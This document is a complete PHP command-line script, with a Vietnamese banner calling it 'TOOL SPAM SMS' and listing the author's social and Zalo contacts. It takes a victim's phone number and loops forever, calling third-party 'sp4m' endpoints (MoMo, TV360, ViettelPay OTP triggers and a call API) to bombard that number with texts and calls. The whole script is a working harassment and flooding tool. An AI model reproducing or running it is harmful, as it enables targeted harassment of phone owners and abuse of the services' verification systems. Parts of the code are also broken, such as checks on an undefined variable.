      error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
/***[ USERAGENT ]***/
$_SESSION['useragent'] = 'Mozilla/5.0 (Linux; Android 10; CPH1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';
/***[ Đánh Dấu Bản Quyền ]***/
$thanh_dep = $do."[" . $trang . "=.=" . $do . "] ".$trang."=> ";
$thanh_xau = $do."[" . $trang . "=.=" . $do . "] ";
/***[ Delay ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
    $_SESSION['load'] = 2000;
} else {
    $_SESSION['load'] = 0;
}
/***[ Banner ]***/
$banner = "
\033[1;31m████████╗████████╗ ██████╗  ██████╗ ██╗     
\033[1;37m╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;31m   ██║█████╗██║   ██║   ██║██║   ██║██║     
\033[1;37m   ██║╚════╝██║   ██║   ██║██║   ██║██║     
\033[1;31m   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;37m   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                                           
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m-_-\033[1;31m] \033[1;37m=> \033[1;33mTOOL SPAM SMS
\033[1;31m[\033[1;37m-_-\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mNguyễn Anh Trường
\033[1;31m[\033[1;37m-_-\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31mTruong14tuoiroi
\033[1;31m[\033[1;37m-_-\033[1;31m] \033[1;37m=> \033[1;32mZALO SUPPORT: \033[1;37mhttps://zalo.me/0375634851
\033[1;31m[\033[1;37m-_-\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://www.youtube.com/@truongtool4258
\033[1;31m────────────────────────────────────────────────────────────\n";
@system("clear");
/***[ Clear + Thông Số Admin ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
    @system('clear'); 
} else { 
    @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
echo $thanh_dep.$luc."Nhập Số Điện Thoại: $trang";
$sdt = trim(fgets(STDIN));
$dem = 0;
echo"\033[1;31m────────────────────────────────────────────────────────────\n";
sleep(3);
while(true) {
        $momo = json_decode(file_get_contents("https://vuabuff.com/api/sp4m/momo.php?sdt=".$sdt), true);
        $dem++;
        echo "\033[1;34m[\033[1;33m".$dem."\033[1;34m] \e[1;32m⌠\e[1;33mAn Orin\e[1;32m⌡\033[1;91m ● \033[1;36m".date("H:i:s")."\033[1;31m ● \033[1;".rand(31,37)."m"." Gửi Thành Công \033[1;31m ● \033[1;37m".$sdt."\n";
        if ($check->status == "success") {
}
$tv360 = json_decode(file_get_contents("https://vuabuff.com/api/sp4m/tv360.php?phone=".$sdt), true)["errorCode"];
        $dem++;
        echo "\033[1;34m[\033[1;33m".$dem."\033[1;34m] \e[1;32m⌠\e[1;33mAn Orin\e[1;32m⌡\033[1;91m ● \033[1;36m".date("H:i:s")."\033[1;31m ● \033[1;".rand(31,37)."m"." Gửi Thành Công \033[1;31m ● \033[1;37m".$sdt."\n";
        if ($check->status == "success") {
}
$calldv = json_decode(file_get_contents("https://hangthaigiasi.com/api/call.php?sdt=".$sdt), true);
        $dem++;
        echo "\033[1;34m[\033[1;33m".$dem."\033[1;34m] \e[1;32m⌠\e[1;33mAn Orin\e[1;32m⌡\033[1;91m ● \033[1;36m".date("H:i:s")."\033[1;31m ● \033[1;".rand(31,37)."m"." Gửi Thành Công \033[1;31m ● \033[1;37m".$sdt."\n";
        if ($check->status == "success") {
}
$viettelpay = json_decode(file_get_contents("https://vuabuff.com/api/sp4m/vtmoney.php?sdt=".$sdt), true);
        $dem++;
        echo "\033[1;34m[\033[1;33m".$dem."\033[1;34m] \e[1;32m⌠\e[1;33mAn Orin\e[1;32m⌡\033[1;91m ● \033[1;36m".date("H:i:s")."\033[1;31m ● \033[1;".rand(31,37)."m"." Gửi Thành Công \033[1;31m ● \033[1;37m".$sdt."\n";
        if ($check->status == "success") {
}
        delay(30);
}
function delay ($delay){
        for($tt = $delay ;$tt>= 0;$tt--){
                print "\r\033[1;33m   Vui Lòng Đợi \033[1;31m ~>       \033[1;32m LO      \033[1;31m | $tt | "; usleep(150000);
print "\r\033[1;31m   Vui Lòng Đợi \033[0;33m   ~>     \033[0;37m LOA     \033[0;31m | $tt | "; usleep(150000);
print "\r\033[1;32m   Vui Lòng Đợi \033[0;33m     ~>   \033[0;37m LOAD    \033[0;31m | $tt | "; usleep(150000);
print "\r\033[1;34m   Vui Lòng Đợi \033[0;33m       ~> \033[0;37m LOADI   \033[0;31m | $tt | "; usleep(150000);
print "\r\033[1;35m   Vui Lòng Đợi \033[0;33m        ~>\033[0;37m LOADIN  \033[0;31m | $tt | "; usleep(150000);  
print "\r\033[1;35m   Vui Lòng Đợi \033[0;33m        ~>\033[0;37m LOADING \033[0;31m | $tt | "; usleep(150000);
print "\r\033[1;35m   Vui Lòng Đợi \033[0;33m        ~>\033[0;37m LOADING.\033[0;31m | $tt | ";usleep(150000);
print "\r                                          \r";
}
}
function chay($t = 23) { for ($x = 0; $x <= $t; $x++) {echo "\033[1;37m=\033[1;31m●";usleep(5000); } echo"\n";}
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { @system('clear'); } else { @system('cls'); }
        for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep($_SESSION['load']);}
        chay(35);
